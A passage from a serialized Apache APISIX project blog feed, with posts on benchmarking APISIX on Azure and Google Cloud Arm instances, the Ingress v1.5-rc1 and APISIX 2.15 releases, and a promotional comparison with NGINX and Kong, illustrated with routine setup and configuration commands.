APISIX.\\n\\n```shell\\nsudo docker run --net=host -d apache/apisix:2.14.1-alpine\\n```\\n\\nCreate routes.\\n\\n```shell\\ncurl \\"http://127.0.0.1:9080/apisix/admin/routes/1\\" \\\\\\n-H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n{  \\n    \\"uri\\": \\"/anything/*\\",\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n              \\"httpbin.org:80\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nAccess the test.\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/anything/das\\n```\\n\\nThe installation is successful if the following results are returned:\\n\\n```shell\\nHTTP/1.1 200 OK\\n.....\\n```\\n\\n## Azure Ddsv5 vs Azure Dpdsv5\\n\\nFrom the above operations, the installation and compatibility test of Apache APISIX on Azure Dpdsv5 can be successfully completed. So what is the actual performance of Azure Dpdsv5? Next, we will use Apache APISIX to do performance test comparisons on Azure Dpdsv5 and Azure Ddsv5 to see their actual performance.\\n\\nAzure Ddsv5 is another model of Azure D series, which is based on Intel\xae x86 architecture, so the above etcd installation steps are slightly different:\\n\\n```shell\\nsudo docker run -d --name etcd \\\\\\n    -p 2379:2379 \\\\\\n    -e ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    -e ALLOW_NONE_AUTHENTICATION=yes \\\\\\n    -e ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    bitnami/etcd:3.4.16\\n```\\n\\n### Single upstream + no plugin\\n\\nUse a single upstream, without any plugins. It mainly tests the performance of APISIX in pure proxy back-to-origin mode.\\n\\n```shell\\n# apisix: 1 worker + 1 upstream + no plugin\\n\\n# create route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Single upstream + two plugins\\n\\nUsing a single upstream, two plugins. It mainly tests the performance of APISIX when the two core performance-consuming plugins, limit-count and prometheus, are enabled.\\n\\n```shell\\n# apisix: 1 worker + 1 upstream + 2 plugins (limit-count + prometheus)\\n\\n# create route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {\\n        \\"limit-count\\": {\\n            \\"count\\": 2000000000000,\\n            \\"time_window\\": 60,\\n            \\"rejected_code\\": 503,\\n            \\"key\\": \\"remote_addr\\"\\n        },\\n        \\"prometheus\\": {}\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Data comparison\\n\\nIn the above two scenarios, relevant tests and comparisons were carried out from the two levels of request QPS (queries per second) and delay time. The result is as follows:\\n\\n1. QPS comparison\\n\\n    ![QPS](https://static.apiseven.com/2022/blog/0808/4.png)\\n2. Latency Comparison\\n\\n    ![Latency](https://static.apiseven.com/2022/blog/0808/5.png)\\n\\n<table>\\n    <tr>\\n        <td><b>  </b></td>\\n        <td colspan=\\"2\\">Single upstream + no plugin</td>\\n        <td colspan=\\"2\\">Single upstream + two plugins</td>\\n    </tr>\\n    <tr>\\n        <td><b>  </b></td>\\n        <td><b>Azure Ddsv5</b></td>\\n        <td><b>Azure Dpdsv5</b></td>\\n        <td><b>Azure Ddsv5</b></td>\\n        <td><b>Azure Dpdsv5</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>QPS(request/s)</b></td>\\n        <td><b>14900</b></td>\\n        <td><b>13400</b></td>\\n        <td><b>13100</b></td>\\n        <td><b>11000</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>Latency(ms)</b></td>\\n        <td><b>1.07</b></td>\\n        <td><b>1.21</b></td>\\n        <td><b>1.21</b></td>\\n        <td><b>1.43</b></td>\\n    </tr>\\n    </table>\\n\\nIt can also be seen from the above data that in network IO-intensive computing scenarios such as API gateways, Dpdsv5 still has a performance gap compared to the same series of Ddsv5. But another good news is that the price of Dpdsv5 is about 20% cheaper than Ddsv5 under the same configuration. In actual machine selection, users can make flexible decisions according to their business volume.\\n\\n## Summary\\n\\nThis article mainly uses Apache APISIX to compare the performance of Azure Ddsv5 and Azure Dpdsv5. It can be seen that in network IO-intensive computing scenarios such as API gateways, Azure Dpdsv5 is not so bright compared to Ddsv5, but since this series of models is still in preview, Microsoft is making continuous improvements and optimizations. Looking forward to its sequel.\\n\\n## Reference\\n\\n[Now in preview: Azure Virtual Machines with Ampere Altra Arm-based processors](https://azure.microsoft.com/en-us/blog/now-in-preview-azure-virtual-machines-with-ampere-altra-armbased-processors/)"},{"id":"Release Apache APISIX Ingress v1.5-rc1","metadata":{"permalink":"/blog/2022/08/05/apisix-ingress-1.5rc1-release","source":"@site/blog/2022/08/05/apisix-ingress-1.5rc1-release.md","title":"Release Apache APISIX Ingress v1.5-rc1","description":"Apache APISIX Ingress Controller v1.5-rc1 is officially released. Bring API Version upgrades, Gateway API support, and updates to Ingress resources.","date":"2022-08-05T00:00:00.000Z","formattedDate":"August 5, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.085,"truncated":true,"authors":[{"name":"Jintao Zhang","url":"https://github.com/tao12345666333","imageURL":"https://github.com/tao12345666333.png"}],"prevItem":{"title":"How is the Azure ARM architecture server perform?","permalink":"/blog/2022/08/08/apache-apisix-performance-test-in-azure"},"nextItem":{"title":"Why do you need Apache APISIX when you have NGINX and Kong?","permalink":"/blog/2022/07/30/why-we-need-apache-apisix"}},"content":"> Apache APISIX Ingress Controller v1.5-rc1 is officially released. Bring API Version upgrades, Gateway API support, and updates to Ingress resources.\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX Ingress Controller v1.5-rc1 version is officially released. This release took about 7 months and 144 commits by 36 contributors. Among them, there are 22 new contributors, thank you for your contribution and support to this project!\\n\\n![Contributors](https://static.apiseven.com/2022/blog/0805/ingress-1.png)\\n\\nNext, let\'s take a look at the important updates in APISIX Ingress v1.5.\\n\\n## All CRD API versions upgraded to v2\\n\\nAt the beginning of the APISIX Ingress project, there were only a few CRDs, and each resource was maintained by its own API version. This leads to a situation in which the API version used by each custom resource is different in the process of subsequent introduction of new resources or function iteration, which increases user learning costs.\\n\\nSo starting from the v1.3 version, we have proposed a [proposal](https://github.com/apache/apisix-ingress-controller/issues/707) that unifies the API version of all resources. After two version iterations, the v2 API version has been officially introduced, and v2beta3 is marked as deprecated, and v2beta3 will be completely removed until the v1.7 version.\\n\\n## Basic support for Gateway API\\n\\nGateway API can be said to be the next generation Ingress definition with richer performance capabilities. We have completed support for most of these resources in APISIX Ingress.\\n\\n:::note\\n\\nThis feature is currently experimental and not enabled by default.\\n\\n:::\\n\\nIf you want to use the Gateway API in APISIX Ingress, you can enable this function by passing the `enable_gateway_ api: true` configuration item in the controller\'s configuration file.\\n\\nAfter installing the CRD of the Gateway API, you can complete the configuration of the Layer7 proxy by creating an `HTTPRoute` resource. As follows:\\n\\n```yaml\\napiVersion: gateway.networking.k8s.io/v1alpha2\\nkind: HTTPRoute\\nmetadata:\\n  name: httpbin-route\\nspec:\\n  hostnames: [\\"httpbin.local\\"]\\n  rules:\\n  - matches:\\n    - path:\\n        type: PathPrefix\\n        value: /ip\\n    backendRefs:\\n    - name: httpbin\\n      port: 80\\n```\\n\\nAfter this configuration takes effect, the client will be able to access the `80` port of the backend `httpbin` through `httpbin.local/ip`.\\n\\nIn addition, we plan to implement support for the remaining two resources, `TCP Route` and `UDP Route` of the Gateway API in v1.6, and plan to introduce a conformance test for the Gateway API to ensure that our implementation matches the expectations of the Gateway API.\\n\\n## Allow Ingress resources to bind arbitrary plugins\\n\\nIn the Apache APISIX Ingress Controller project, Kubernetes native Ingress resources are supported for proxy configuration, but if you want to use APISIX\'s rich plugin capabilities in Ingress resources, you must add Annotation to complete it, and you need to implement the logic corresponding to Annotation.\\n\\nThis approach limits the plugin capabilities of the Ingress resource, and developing Annotaion separately for each plugin is a relatively expensive affair.\\n\\nIn the v1.5 release, we made it possible to enable the Ingress resource by adding a new Annotaion `k8s.apisix.apache.org/plugin-config-name`, which allows to refer to any `Apisix Plugin Config` resource Ingress resources are free to use the ability of any APISIX plugin.\\n\\nThis will greatly increase the ease of use of APISIX Ingress Controller, and will also reduce the cost for users to migrate from other Ingress controllers to APISIX Ingress Controller.\\n\\n## More details\\n\\nIn addition to these features, many other features have been added to this release. for example:\\n\\n- A mechanism for synchronizing data from the Kubernetes cluster to the APISIX cluster on a regular basis to ensure the consistency of the data in the APISIX cluster and the configuration in the Kubernetes cluster;\\n- Add more authentication methods for ApisixConsumer resources;\\n- Compatibility with APISIX v2.15;\\n- Update all dependencies to the latest version to reduce security risks;\\n\\nFor more specific release details, please refer to v1.5-rc1\'s [Changelog](https://github.com/apache/apisix-ingress-controller/blob/v1.5.0/CHANGELOG.md#150-rc1)."},{"id":"Why do you need Apache APISIX when you have NGINX and Kong?","metadata":{"permalink":"/blog/2022/07/30/why-we-need-apache-apisix","source":"@site/blog/2022/07/30/why-we-need-apache-apisix.md","title":"Why do you need Apache APISIX when you have NGINX and Kong?","description":"This article introduces how the cloud native API gateway Apache APISIX solves the business pain points and usage scenarios brought by Nginx and Kong.","date":"2022-07-30T00:00:00.000Z","formattedDate":"July 30, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.93,"truncated":true,"authors":[{"name":"Fei Han","url":"https://github.com/hf400159","imageURL":"https://github.com/hf400159.png"}],"prevItem":{"title":"Release Apache APISIX Ingress v1.5-rc1","permalink":"/blog/2022/08/05/apisix-ingress-1.5rc1-release"},"nextItem":{"title":"Release Apache APISIX 2.15","permalink":"/blog/2022/07/29/release-apache-apisix-2.15"}},"content":"> This article describes the history of the open source API Gateway Apache APISIX architecture\'s evolution and compares the advantages of the two frameworks, Apache APISIX and Nginx.\\n\\n\x3c!--truncate--\x3e\\n\\nIn the cloud-native era, dynamic capability and observability have become the standards for measuring API gateways. Apache APISIX has been following in the footsteps of cloud-native since its inception. However, as a new-generation API gateway that was born just three years ago, why can Apache APISIX stand out from NGINX, which has been born for more than 20 years, and Kong, which has been open source for 8 years, and become the most popular and active gateway in the cloud-native era? The most important reason is that it solves the pain points of developers and enterprises in using NGINX and Kong.\\n\\n## NGINX and Kong\'s Disadvantages\\n\\nIn the era of monolithic services, NGINX can handle most scenarios, but in the cloud-native era, NGINX has two problems due to its architecture:\\n\\n- First, NGINX does not support cluster management. Almost every Internet manufacturer has its own NGINX configuration management system, and there is no unified solution.\\n- The second is that NGINX does not support hot reloading of configurations. If a company modifies the configuration of NGINX, it can take more than half an hour to reload NGINX. And under the Kubernetes system, the upstream will change frequently. If NGINX is used, the service needs to be restarted frequently, which is unacceptable for enterprises.\\n\\nThe emergence of Kong solves the shortcomings of NGINX, but brings new problems:\\n\\n- Kong needs to rely on PostgreSQL or Cassandra database, which makes Kong\'s entire architecture very bloated and will bring a high availability problem to the enterprise. If the database fails, the entire API Gateway fails.\\n- Kong\'s routing uses traversal lookup. When there are more than a thousand routes in the gateway, its performance will drop dramatically.\\n\\nThe emergence of APISIX solves all the above problems and becomes the most perfect API gateway in the cloud-native era. So what exactly are the advantages of Apache APISIX? Why can it become the most active API gateway in the world in just three years?\\n\\n## Advantages of Apache APISIX\\n\\n### Excellent architecture\\n\\nFirst, Apache APISIX has excellent architecture, and many applications are now migrating to microservices and containerization, forming a new cloud-native era. Cloud-native, as the current technology trend, will rewrite the technical architecture of traditional enterprises. And APISIX has followed the technology trend since its inception and designed it as cloud-native architecture:\\n\\n![APISIX](https://static.apiseven.com/2022/blog/0729/1.png)\\n\\nAs shown in the figure above, the left and right are the Data Plane and the Control Plane of APISIX:\\n\\n- Data Plane: Based on NGINX\'s network library (without using NGINX\'s route matching, static configuration, and C modules), use Lua and NGINX to dynamically control request traffic;\\n- Control Plane: use etcd to store and synchronize gateway configuration data, administrators can notify all data plane nodes in milliseconds through Admin API or Dashboard.\\n\\nWhen updating data, Kong uses the polling method of the database, but it may take 5-10 seconds to obtain the latest configuration; while APISIX uses the method of monitoring etcd configuration changes, which can control the time in milliseconds.\\n\\nSince both APISIX and etcd support multi-point deployment, in the current architecture of APISIX, any unexpected downtime of any service will not affect the ability of APISIX to provide services accurately.\\n\\n### Perfect ecosystem\\n\\nThe following figure shows the ecological map of APISIX. From this figure, we can accurately see that the L7 protocols that APISIX already supports include HTTP(S), HTTP2, Dubbo and IoT protocol MQTT, etc. The L4 protocol includes TCP/UDP.\\n\\nThe right part is some open source or SaaS services, such as SkyWalking, Prometheus, Vault, etc. At the bottom are the more common operating system environments, cloud vendors, and hardware environments. As open source software, APISIX also supports running on ARM64 servers.\\n\\n![APISIX\'s Ecosystem](https://static.apiseven.com/2022/blog/0729/2.PNG)\\n\\nAPISIX not only supports many protocols and operating systems, but also supports multi-language programming plug-ins. When it first came out, APISIX only supported the use of the Lua language to write plug-ins. In this case, developers need to master the technology stack related to Lua and NGINX. However, Lua and NGINX are relatively niche technologies with few developers. Therefore, we have supported multi-language development plug-ins on APISIX, and have officially supported languages such as Java, Golang, Node.js, and Python.\\n\\n![programming language](https://static.apiseven.com/2022/blog/0729/3.png)\\n\\n### Active community\\n\\nThe figure below is the contributor growth curve, where the horizontal axis represents the timeline and the vertical axis represents the total number of contributors. We can see that the two projects, Apache APISIX and Kong, are relatively more active. Apache APISIX has maintained a very good growth rate from the first day, and is growing rapidly at a rate close to twice that of Kong, and the number of contributors has exceeded Kong, which shows the popularity of APISIX. Of course, there are many other ways to evaluate the activity of a project, such as checking the monthly active issues, the total number of PRs, etc. The good news is that APISIX is also unrivaled in these aspects.\\n\\n![Contributor graph](https://static.apiseven.com/2022/blog/0729/4.png)\\n\\n## APISIX Application Scenario\\n\\nFrom the figure below, I believe you have already seen the goal of APISIX: **unified proxy infrastructure**.\\n\\n![APISIX Application scenarios](https://static.apiseven.com/2022/blog/0729/5.png)\\n\\nYou may have questions: APISIX has to support so many scenarios, will APISIX become different?\\n\\nBecause the core of APISIX is a high-performance proxy service, it does not bind any environment properties. When it evolves into products such as Ingress, service mesh, etc., all external services cooperate with APISIX, and it is the external program that changes rather than APISIX itself. The following will introduce to you step-by-step how APISIX supports these scenarios.\\n\\n### Load Balancer and API Gateway\\n\\nThe first is for traditional LB and API gateway scenarios. Because APISIX is implemented based on NGINX + LuaJIT, it has features such as high performance and security, and also supports dynamic SSL certificate offloading, SSL handshake optimization and other functions. In terms of load balancing service capabilities, it also performs better. Switching from NGINX to APISIX will not degrade performance, but also enjoy the improved management efficiency brought about by features such as dynamic and unified management.\\n\\n### Microservice Gateway\\n\\nAPISIX currently supports the writing of extension plug-ins in multiple languages, which can solve the main problems faced by east-west microservice API gateways - heterogeneous multi-language and general problems. The built-in supported service registries include Nacos, etcd, Eureka, etc., as well as the standard DNS method, which can smoothly replace the microservice API gateways such as Zuul, Spring Cloud Gateway, and Dubbo.\\n\\n### Kubernetes Ingress\\n\\nAt present, the official Kubernetes Ingress Controller project of K8s is mainly based on the NGINX configuration file method, so it is slightly insufficient in routing capability and loading mode and has some obvious disadvantages. For example, when adding or modifying any API, you need to restart the service to complete the update of the new NGINX configuration, but the restart of the service has a great impact on the online traffic.\\n\\nThe [APISIX Ingress Controller](https://apisix.apache.org/zh/docs/ingress-controller/getting-started/) perfectly solves all the problems mentioned above: it supports full dynamics and does not need to restart loading. At the same time, it inherits all the advantages of APISIX and also supports native Kubernetes CRD, which is convenient for users to migrate.\\n\\n![APISIX Kubernetes Ingress](https://static.apiseven.com/2022/blog/0729/6.png)\\n\\n### Service mesh\\n\\nIn the next five to ten years, the service mesh architecture based on the cloud-native model architecture will begin to emerge. APISIX also started to lock the track in advance. After research and technical analysis, APISIX has supported the xDS protocol, and APISIX Mesh was born, and APISIX also has a place in the field of service mesh.\\n\\n![APISXI Mesh](https://static.apiseven.com/2022/blog/0729/7.png)\\n\\n## Summary\\n\\nIt has been three years since the first day when Apache APISIX was open-sourced. The highly active community and actual user cases have proved that APISIX is the most perfect API gateway in the cloud-native era. By reading this article, I believe you have a more comprehensive understanding of APISIX and look forward to using APISIX as your API gateway in a production environment.\\n\\nIf you have any questions, you can leave a message in [Github issue](https://github.com/apache/apisix/issues), community contributors will respond quickly, of course, you can also join the APISIX Slack channel and mailing list, Please refer to [Join Us](https://apisix.apache.org/docs/general/join/)."},{"id":"Release Apache APISIX 2.15","metadata":{"permalink":"/blog/2022/07/29/release-apache-apisix-2.15","source":"@site/blog/2022/07/29/release-apache-apisix-2.15.md","title":"Release Apache APISIX 2.15","description":"API Gateway Apache APISIX 2.15 is officially released! You can customize plugin priority and whether the plugin is executed, custom error response, and indicators to support the monitoring of four layers of traffic.","date":"2022-07-29T00:00:00.000Z","formattedDate":"July 29, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.375,"truncated":true,"authors":[{"name":"Zexuan Luo","title":"Author","url":"https://github.com/spacewander","image_url":"https://github.com/spacewander.png","imageURL":"https://github.com/spacewander.png"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Why do you need Apache APISIX when you have NGINX and Kong?","permalink":"/blog/2022/07/30/why-we-need-apache-apisix"},"nextItem":{"title":"How is Google Cloud Tau T2A performing? ","permalink":"/blog/2022/07/22/how-is-google-cloud-tau-t2a-performing"}},"content":"> Apache APISIX 2.15 is officially released! You can customize plugin priority and whether the plugin is executed, custom error response, and indicators to support the monitoring of four layers of traffic.\\n\\n\x3c!--truncate--\x3e\\n\\nSince the first 2.0 version was released two years ago, APISIX has released 15 minor versions and many patch versions. As the last minor version of the 2.x series, version 2.15 can be said to be a link between the previous and the next.\\n\\n\\"Link\\" is because this version continues to introduce more functions, making plugin configuration more flexible, and also will be the last LTS version of version 2.x. Later APISIX will be moving to version 3.0 in the future. Let\'s see below for more details!\\n\\n![Update summary](https://static.apiseven.com/2022/blog/0729/blog-en1.png)\\n\\n## Custom plugin priority\\n\\nThe new version allows users to customize the priority of the plugin instead of directly applying the plugin\'s default priority properties.\\n\\nWith this feature, we can adjust the execution order of several plugins on a specific route, thus breaking the constraints of the previous plugin priority properties.\\n\\nBy default, the `serverless-post-function` plugin is executed after the `serverless-pre-function` plugin. But with this feature, the `serverless-post-function` plugin can be made to execute first. A configuration example is as follows:\\n\\n```json\\n {\\n    \\"serverless-post-function\\": {\\n        \\"_meta\\": {\\n            \\"priority\\": 10000\\n        },\\n        \\"phase\\": \\"rewrite\\",\\n        \\"functions\\" : [\\"return function(conf, ctx)\\n                    ngx.say(\\\\\\"serverless-post-function\\\\\\");\\n                    end\\"]\\n    },\\n    \\"serverless-pre-function\\": {\\n        \\"_meta\\": {\\n            \\"priority\\": -2000\\n        },\\n        \\"phase\\": \\"rewrite\\",\\n        \\"functions\\": [\\"return function(conf, ctx)\\n                    ngx.say(\\\\\\"serverless-pre-function\\\\\\");\\n                    end\\"]\\n    }\\n}\\n```\\n\\n:::note\\n\\nIf a plugin configuration does not indicate priority, it is sorted by the priority property value in the plugin code.\\n\\nIf you specify the priority of the plugin in the plugin configuration of the Service or Plugin Config, it will still take effect after merging into the route.\\n\\n:::\\n\\n## Custom plugin whether to execute\\n\\nIn addition to being able to adjust the execution order, you can also dynamically decide whether the plugin needs to be executed. In version 2.15, a plugin configuration level filter was introduced, and the execution result of the filter controls whether the plugin executes or not.\\n\\nIn the configuration below, the `http-logger` plugin will only be executed if the variable `$status` is greater than or equal to 400. This way, only 4xx and 5xx requests will be reported to the remote HTTP log server.\\n\\n```json\\n{\\n    \\"http-logger\\": {\\n        \\"_meta\\": {\\n            \\"filter\\": {\\n                {\\"status\\", \\"!\\", \\"<\\", \\"400\\"}\\n            }\\n        },\\n        ...\\n    }\\n}\\n```\\n\\nAt the same time, with the help of another function of APISIX [custom variables](https://apisix.apache.org/docs/apisix/next/plugin-develop/#register-custom-variable), you can play more tricks. For example, if the client-side address is an intranet address, skip a scene such as Logger.\\n\\n## Custom error response\\n\\nThis function is also a new function configured at the specific plugin level, which belongs to the error message at the plugin configuration level.\\n\\nThis feature can come in handy if the requester requires an error response on a specific route. No matter what the plugin is, this configuration can set a fixed response result, avoiding the trouble caused by the built-in error response information of the plugin.\\n\\nAs shown in the configuration below, whatever error message the `jwt-auth` plugin returns will be rewritten as \\"Missing credential in request\\" and returned to the client side.\\n\\n```json\\n{\\n    \\"jwt-auth\\": {\\n        \\"_meta\\": {\\n            \\"error_response\\": {\\n                \\"message\\": \\"Missing credential in request\\"\\n            }\\n        }\\n    }\\n}\\n```\\n\\n## Allow collection of metrics on Stream Route\\n\\nA major change in this release is to allow metrics to be collected on Stream Route and exposed through the Prometheus interface.\\n\\nThis feature is turned off by default, if you need to enable it, build on the [APISIX-Base](https://apisix.apache.org/docs/apisix/FAQ/#how-do-i-build-the-apisix-base-environment) version and enable the `prometheus` plugin in config.yaml, an example is as follows:\\n\\n```yaml  title=\\"./conf/config.yaml\\"\\nstream_plugins:\\n  - ...\\n  - prometheus\\n```\\n\\nWhen the plugin is enabled, even if only APISIX is used to proxy TCP traffic on Layer 4, it will specifically listen on port 9091 in response to HTTP requests from Prometheus.\\n\\nAs with the `prometheus` plugin in the HTTP proxy subsystem section, the next step is to configure the plugin on the Stream Route that needs to collect metrics:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/stream_routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"prometheus\\":{}\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:80\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nAfter connecting to the Stream Route, you can click http://127.0.0.1:9091/apisix/prometheus/metrics to see the following TCP proxy statistics:\\n\\n```shell\\n...\\n# HELP apisix_node_info Info of APISIX node\\n# TYPE apisix_node_info gauge\\napisix_node_info{hostname=\\"desktop-2022q8f-wsl\\"} 1\\n# HELP apisix_stream_connection_total Total number of connections handled per stream route in APISIX\\n# TYPE apisix_stream_connection_total counter\\napisix_stream_connection_total{route=\\"1\\"} 1\\n```\\n\\nAt present, this function only realizes the number of statistical connections, and more statistical indicators will be added as needed in the future.\\n\\nIn addition to the normal Stream Route, this version also provides statistical indicators for the Redis proxy function under xRPC. Such as command count indicators broken down by Route and Command `apisix_redis_commands_total` and delay time indicators `apisix_redis_commands_latency_seconds_bucket`.\\n\\n## More features\\n\\nAt the level of new features, in addition to the several functions mentioned above, this version also contains many detailed changes:\\n\\n* Supports Upstream objects to reference certificates from SSL objects\\n* `prometheus` available in the `ngx.shared.dict` statistics\\n* `openid-connect` plugin supports PKCE extension\\n\\nFor more specific release details, please refer to [2.15 Changelog](https://github.com/apache/apisix/blob/release/2.15/CHANGELOG.md#2150)."},{"id":"How is Google Cloud Tau T2A performing? ","metadata":{"permalink":"/blog/2022/07/22/how-is-google-cloud-tau-t2a-performing","source":"@site/blog/2022/07/22/how-is-google-cloud-tau-t2a-performing.md","title":"How is Google Cloud Tau T2A performing? ","description":"This article mainly uses the cloud native API gateway Apache APISIX to compare the performance of Google Cloud T2A and Google Cloud T2D.","date":"2022-07-22T00:00:00.000Z","formattedDate":"July 22, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.2,"truncated":true,"authors":[{"name":"Shirui Zhao","title":"Author","url":"https://github.com/soulbird","image_url":"https://github.com/soulbird.png","imageURL":"https://github.com/soulbird.png"}],"prevItem":{"title":"Release Apache APISIX 2.15","permalink":"/blog/2022/07/29/release-apache-apisix-2.15"},"nextItem":{"title":"Biweekly Report (Jul 1 - Jul 15)","permalink":"/blog/2022/07/21/weekly-report-0715"}},"content":"> This article mainly uses Apache APISIX to compare the performance of Google Cloud T2A and Google Cloud T2D.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nOn July 13, Google Cloud released a preview of the first series of Arm-based Tau T2A VMs. The T2A VM is powered by an Ampere\xae Altra\xae Arm-based processor that Google claims has an attractive price and excellent single-threaded performance.\\n\\nIt is worth noting that Ampere\xae Altra\xae Arm is a cloud-native processor, and the Tau T2A virtual machine based on the Ampere\xae Altra\xae Arm processor can run scale-out cloud-native applications efficiently.\\n\\nSo how about the actual experience and performance? Let\'s take a cloud-native API Gateway as an example to show you the performance of the Google Cloud Tau T2A virtual machine. We chose Apache APISIX for testing on the Google Cloud T2A server environment.\\n\\nApache APISIX is a cloud-native, high-performance, scalable API gateway. Built on NGNIX+LuaJIT and etcd, APISIX has the characteristics of dynamic routing and plugin hot-reloading compared with traditional API gateways, which are especially suitable for API management in the cloud-native architecture.\\n\\n![network error/APISIX Architecture.png](https://static.apiseven.com/2022/blog/0722/1.PNG)\\n\\n## Preliminary Preparation\\n\\nFirst, we need to start a T2A instance on Google Cloud, and choose Ubuntu 20.04 as the operating system.\\n\\n![network error/Google Cloud T2A.png](https://static.apiseven.com/2022/blog/0722/2.png)\\n\\nInstall Docker, so that we can install and deploy Apache APISIX in a containerized way.\\n\\n```shell\\nsudo apt-get update && sudo apt-get install docker.io\\n```\\n\\n## Install Apache APISIX\\n\\nApache APISIX uses etcd as the configuration center, so we need to start an etcd instance first.\\n\\n```shell\\nsudo docker run -d --name etcd \\\\\\n    -p 2379:2379 \\\\\\n    -e ETCD_UNSUPPORTED_ARCH=arm64 \\\\\\n    -e ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    -e ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    rancher/coreos-etcd:v3.4.16-arm64\\n```\\n\\nStart an instance of Apache APISIX.\\n\\n```shell\\nsudo docker run --net=host -d apache/apisix:2.14.1-alpine\\n```\\n\\nCreate route:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9080/apisix/admin/routes/1\\" \\\\\\n-H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n{  \\n    \\"uri\\": \\"/anything/*\\",\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n              \\"httpbin.org:80\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nDo the following test.\\n\\n```\\ncurl -i http://127.0.0.1:9080/anything/das\\n```\\n\\n```shell\\nHTTP/1.1 200 OK\\n.....\\n```\\n\\n## Google Cloud T2D vs Google Cloud T2A\\n\\nFrom the previous steps, the installation and compatibility testing of Apache APISIX on Google Cloud Tau T2A can be successfully completed. So what is the actual performance of Google Cloud T2A? Next, we will use Apache APISIX to do a performance test on Google Cloud T2A and Google Cloud T2D to see their actual performance.\\n\\nGoogle Cloud T2D is another model of Google Cloud Tau series, which is based on AMD x86 architecture, so the etcd installation steps are slightly different from above:\\n\\n```shell\\nsudo docker run -d --name etcd \\\\\\n    -p 2379:2379 \\\\\\n    -e ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    -e ALLOW_NONE_AUTHENTICATION=yes \\\\\\n    -e ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    bitnami/etcd:3.4.16\\n```\\n\\nFor simplicity, only one worker is enabled in this test with Apache APISIX, and the following performance test data are all run on a single-core CPU.\\n\\n### Scenario 1: Single upstream\\n\\nUsing a single upstream without any plugins: it mainly tests the performance of APISIX in pure proxy back-to-origin mode.\\n\\n```shell\\n# apisix: 1 worker + 1 upstream + no plugin\\n\\n# create route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Scenario 2: Single upstream + two plugins\\n\\nUsing a single upstream with two plugins: it mainly tests the performance of APISIX when the two core performance-consuming plugins, `limit-count` and `prometheus` are enabled.\\n\\n```shell\\n# apisix: 1 worker + 1 upstream + 2 plugins (limit-count + prometheus)\\n\\n# create route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {\\n        \\"limit-count\\": {\\n            \\"count\\": 2000000000000,\\n            \\"time_window\\": 60,\\n            \\"rejected_code\\": 503,\\n            \\"key\\": \\"remote_addr\\"\\n        },\\n        \\"prometheus\\": {}\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    }\\n}\'\\n```\\n\\nIn the above two scenarios, relevant tests and comparisons were carried out regarding the request QPS(Queries Per Second) and delay time. The result is as follows:\\n\\n- QPS comparison:\\n\\n![network error/QPS 